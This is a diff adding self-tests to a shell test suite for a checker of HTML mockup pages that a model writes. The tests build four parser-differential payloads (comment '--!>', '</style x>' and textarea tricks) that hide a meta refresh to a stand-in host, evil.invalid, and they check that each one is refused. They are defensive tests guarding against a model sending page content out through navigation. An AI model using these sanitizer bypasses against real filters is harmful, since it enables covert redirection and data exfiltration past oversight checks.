@@ -168,4 +168,26 @@ printf '%s' "${CLEAN1/<main>/<main><script>alert(1)</script>}" > "$T/workspace/m
 ck "a saved page that was changed to hold a script is refused again when it is read" '! MP page "$T" "$BRIEF" available-books >/dev/null 2>"$T/why" && grep -q "no longer passes" "$T/why"'
 ck "a page name outside the manifest is refused"   '! MP page "$T" "$BRIEF" ../manifest >/dev/null 2>&1 && ! MP page "$T" "$BRIEF" nothing >/dev/null 2>&1'
 
+# ---- R7: what the checker sees is what the browser sees ------------------------------------------------------------------------
+# html.parser ends a comment at "-->" and a <style> at "</style>"; a browser ends a comment at "--!>" and a <style> at "</style x>". A meta refresh hidden in
+# the gap passed the check and navigated the frame (or the 'Open full size' tab) to an address of the model's choosing, carrying whatever the page said.
+REFRESH='<meta http-equiv=refresh content="0;url=http://evil.invalid/x">'
+nerr() { python3 -c 'import sys; sys.path.insert(0, sys.argv[1]); import mockup; print(len(mockup.check_page(sys.stdin.read())["errors"]))' "$T/bin" <<<"$1"; }
+BYP_A=$(PAGE ok "<!-- x --!>$REFRESH -->")
+BYP_B=$(PAGE ok '' "p{}</style x>$REFRESH<style>")
+BYP_C=$(PAGE "ok<!-- --!>$REFRESH -->")
+BYP_D=$(PAGE ok "<textarea><!-- --!></textarea x>$REFRESH</textarea>")
+bad=""; for v in A B C D; do eval "h=\$BYP_$v"; [ "$(nerr "$h")" != 0 ] || bad="$bad $v"; done; [ "$(python3 -c 'import sys; sys.path.insert(0, sys.argv[1]); import mockup; print(len(mockup.check_page("<!doctype html><p>a\x00b</p>")["errors"]))' "$T/bin")" != 0 ] || bad="$bad NUL"
+ck "R7 the comment, <style>, <title> and <textarea> bypasses of the meta-refresh check, and a NUL byte, are each refused${bad:+ — PASSED THE CHECK:$bad}" '[ -z "$bad" ]'
+ck "R7 control: an ordinary page with no comment still passes" '[ "$(nerr "$CLEAN1")" = 0 ]'
+ck "R7 any comment at all is refused (the model has no reason to write one)" '[ "$(nerr "$(PAGE ok "<!-- hello -->")")" != 0 ]'
+SER=$(python3 -c 'import sys; sys.path.insert(0, sys.argv[1]); import mockup; print(mockup.serialize(sys.stdin.read()), end="")' "$T/bin" <<<"$CLEAN1" 2>&1)
+ck "R7 the page that is saved is re-serialised from the parser's events (and passes the check again), so the browser reads exactly what was checked" \
+   '[ -n "$SER" ] && [ "$(nerr "$SER")" = 0 ] && grep -q "<main>" <<<"$SER"'
+if st_have_browser; then
+  for v in A B C D; do eval "h=\$BYP_$v"; printf '%s' "$h" > "$T/byp-$v.html"; done
+  ctl=""; for v in A B C D; do r=$(node "$REAL/bin/selftest-refresh-probe.js" "$T/byp-$v.html" 2>&1 | tail -1); [ "$r" = NAVIGATED ] || ctl="$ctl $v:$r"; done
+  ck "R7 control, real Chromium: each bypass page, served as it was, DOES navigate to the other address (so the strings mean something)${ctl:+ — did not:$ctl}" '[ -z "$ctl" ]'
+else st_skip "R7 real-browser control (no playwright/Chromium here)"; fi
+
 st_done
